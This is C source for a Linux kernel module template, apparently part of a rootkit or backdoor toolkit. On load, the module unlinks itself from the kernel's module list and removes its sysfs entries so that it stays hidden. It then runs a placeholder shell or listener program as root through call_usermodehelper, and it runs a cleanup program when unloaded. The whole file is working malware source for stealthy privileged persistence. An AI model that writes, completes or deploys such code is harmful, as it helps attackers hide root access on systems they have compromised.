/*
 * This is the template file used to build a system
 * specific kernel module.
*/

#include<linux/init.h>
#include<linux/module.h>
#include<linux/kmod.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Ciaran McNally - maK");
#define SHELL "SHELL_TEMPLATE"
#define CLEANUP "CLEAN_TEMPLATE"

static struct list_head *modList;

static int start_listener(void){
	char *argv[] = { SHELL, NULL, NULL };
	static char *env[] = {
		"HOME=/",
		"TERM=linux",
		"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
	return call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC);
}


//Hiding the kernel module
void hide_module(void){

	modList = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	kobject_del(&THIS_MODULE->mkobj.kobj);
	THIS_MODULE->sect_attrs = NULL;
	THIS_MODULE->notes_attrs = NULL;
}

static int kill_listener(void){
	char *argv[] = { CLEANUP, NULL, NULL };
	static char *env[] = {
		"HOME=/",
		"TERM=linux",
		"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
	return call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC);
}


static int init_mod(void){
	hide_module();
	return start_listener();
}

static void exit_mod(void){
	kill_listener();
	return;
}
module_init(init_mod);
module_exit(exit_mod);
